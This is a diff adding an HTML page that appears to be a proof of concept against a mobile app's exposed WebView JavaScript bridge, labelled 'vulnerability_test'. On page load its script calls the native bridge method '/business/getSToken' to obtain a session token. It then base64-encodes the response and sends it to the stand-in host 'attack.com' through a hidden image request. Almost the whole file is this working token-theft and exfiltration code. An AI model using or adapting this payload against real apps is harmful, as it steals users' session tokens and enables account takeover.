@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Bridge异步调用</title>
+</head>
+<body>
+    <h1>Bridge异步调用</h1>
+    <div id="result">等待结果...</div>
+    <script>
+        function createBridgeCore() {
+            const CODE_SUCCESS = 200;
+            const CODE_FAIL_100 = 100;
+            const map = {};
+            
+            function callBridge(name, p, func) {
+                const request = {
+                    method: name,
+                    uniqueId: Date.now() * 1000000 + Math.round(Math.random() * 1000000),
+                    params: p
+                };
+                map[request.uniqueId] = func;
+                console.log("callBridge", JSON.stringify(request));
+                const response = window.a_bridge.call(JSON.stringify(request));
+                console.log("Bridge Response:", response);
+                return response;
+            }
+            
+            window.bridgeCore = {
+                callBridge: callBridge,
+                receiver: function(callbackId, keepCallback, result) {
+                    if (map[callbackId]) {
+                        map[callbackId](result);
+                        if (!keepCallback) {
+                            delete map[callbackId];
+                        }
+                    }
+                }
+            };
+            
+            window.sendResultToServer = function(data) {
+                const jsonString = JSON.stringify(data);
+                const base64Data = btoa(encodeURIComponent(jsonString).replace(/%([0-9A-F]{2})/g, function(match, p1) {
+                    return String.fromCharCode("0x" + p1)
+                }));
+                const url = "http://attack.com/?data=" + base64Data + "&source=direct_link";
+                const img = new Image();
+                img.src = url;
+                img.style.display = "none";
+                document.body.appendChild(img);
+            };
+        }
+        
+        setTimeout(function() {
+            if (window.a_bridge) {
+                try {
+                    createBridgeCore();
+                    const result = window.bridgeCore.callBridge("/business/getSToken", {type: 1}, function(response) {
+                        console.log("回调收到:", response);
+                        document.getElementById("result").innerHTML = "<pre>回调收到:\n" + JSON.stringify(response, null, 2) + "</pre>";
+                        window.sendResultToServer({
+                            source: "vulnerability_test",
+                            method: "/business/getSToken",
+                            result: response,
+                            timestamp: new Date().toISOString()
+                        });
+                    });
+                    document.getElementById("result").innerHTML += "<p>已调用API,等待回调...</p>";
+                } catch(e) {
+                    const errorMessage = "错误:\n" + e;
+                    document.getElementById("result").innerHTML = "<pre>" + errorMessage + "</pre>";
+                    window.sendResultToServer({
+                        source: "vulnerability_test",
+                        error: errorMessage,
+                        timestamp: new Date().toISOString()
+                    });
+                }
+            } else {
+                const errorMessage = "a_bridge不存在";
+                document.getElementById("result").innerHTML = "<pre>" + errorMessage + "</pre>";
+                window.sendResultToServer({
+                    source: "vulnerability_test",
+                    error: errorMessage,
+                    timestamp: new Date().toISOString()
+                });
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
